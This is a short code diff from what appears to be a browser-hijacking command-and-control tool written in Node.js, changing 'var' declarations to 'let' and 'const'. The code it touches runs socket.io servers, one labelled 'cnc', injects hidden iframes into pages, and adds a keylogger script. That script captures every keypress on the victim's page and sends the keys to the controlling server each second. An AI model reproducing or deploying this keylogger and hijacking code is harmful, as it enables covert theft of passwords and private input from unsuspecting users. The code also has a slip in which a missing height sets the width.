@@ -1,5 +1,5 @@
-var io = require('socket.io')(7305);
-var cnc = require('socket.io')(7035);
+const io = require('socket.io')(7305);
+const cnc = require('socket.io')(7035);
 const fs = require('fs');
 
 let currentOperator = "";
@@ -94,7 +94,7 @@ function IframeIt(siteToIframe, hidden, width, height) {
     if (!width) width = "640px";
     if (!height) width = "480px";
 
-    var ifrm = document.createElement("iframe");
+    let ifrm = document.createElement("iframe");
     ifrm.setAttribute("src", siteToIframe);
     ifrm.style.width = width;
     ifrm.style.height = height;
@@ -104,7 +104,7 @@ function IframeIt(siteToIframe, hidden, width, height) {
 }
 
 function AddKeyLogger() {
-    var kl = document.createElement('script');
+    let kl = document.createElement('script');
     kl.innerHTML = "function PrintToFileZ(whatToPrint){socket.emit('dumpk', whatToPrint);}let keys=''; document.onkeypress = function(e) {get = window.event?event:e;key = get.keyCode?get.keyCode:get.charCode;key = String.fromCharCode(key);keys+=key;};setInterval(function(){PrintToFileZ(keys)}, 1000)"
     document.body.appendChild(kl);
 }
